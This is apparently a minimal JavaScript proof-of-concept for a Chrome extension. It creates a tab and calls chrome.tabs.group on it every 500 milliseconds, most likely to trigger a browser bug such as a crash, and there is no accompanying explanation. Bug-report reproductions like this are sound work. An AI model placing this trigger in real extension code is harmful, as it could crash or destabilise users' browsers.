

async function poc(){


  
  try {
  chrome.tabs.create({windowId:undefined, index:0}, function(tab) {
      setInterval(function(){chrome.tabs.group({tabIds:[tab.id]}, function(groupId) {})}, 500)
  });
  } catch(e) {}
  
      
  }
  
  poc();
  
